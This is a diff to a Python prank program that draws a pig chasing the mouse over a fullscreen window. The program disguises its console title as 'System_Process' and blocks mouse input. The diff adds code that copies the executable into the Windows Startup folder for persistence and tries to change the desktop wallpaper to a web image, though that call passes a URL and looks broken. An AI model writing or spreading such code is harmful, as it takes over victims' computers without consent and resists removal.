@@ -4,6 +4,9 @@ import random
 import math
 import pynput
 import ctypes
+import sys
+import os
+import shutil
 
 ctypes.windll.kernel32.SetConsoleTitleW("System_Process")
 
@@ -22,6 +25,8 @@ canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_scree
 canvas.pack()
 
 def dessiner_cochon(x, y, eating=False):
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, "https://media.ouest-france.fr/v1/pictures/MjAxNzAzMjk0MzZhZDFkMTRjZDQ0OTNlYTZmZjRkMjIwNzJkYmQ?width=1260&height=708&focuspoint=50%2C25&cropresize=1&client_id=bpeditorial&sign=7b408f3c524bf02ce6d83fb8576186bbf8a6193f3b36763767adc93b15b42671", 0)
+
     global pattes_deplacees
     canvas.delete("cochon")
     canvas.create_oval(x, y, x + cochon_size, y + cochon_size, fill="pink", outline="", tags="cochon")
@@ -64,8 +69,8 @@ def bouger_vers_souris():
 def cacher_souris():
     mouse_listener = pynput.mouse.Listener(suppress=True)
     mouse_listener.start()
-    keyboard_listener = pynput.keyboard.Listener(suppress=True)
-    keyboard_listener.start()
+    #keyboard_listener = pynput.keyboard.Listener(suppress=True)
+    #keyboard_listener.start()
 
 def deplacer_aleatoirement():
     global cochon_x, cochon_y, pattes_deplacees
@@ -86,6 +91,22 @@ def deplacer_aleatoirement():
     pattes_deplacees = not pattes_deplacees
     dessiner_cochon(cochon_x, cochon_y)
     root.after(300, deplacer_aleatoirement)
+
+
+def ajouter_au_demarrage(programme_nom):
+    programme_chemin = os.path.abspath(sys.argv[0])
+    dossier_demarrage = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    destination = os.path.join(dossier_demarrage, programme_nom + ".exe")
+
+    try:
+        shutil.copyfile(programme_chemin, destination)
+        print(f"Programme {programme_nom} ajouté au démarrage avec succès.")
+    except Exception as e:
+        print(f"Erreur lors de l'ajout au démarrage: {e}")
+
+programme_nom = 'main'
+
+ajouter_au_demarrage(programme_nom)
 
 def stop_program(event=None):
     root.destroy()
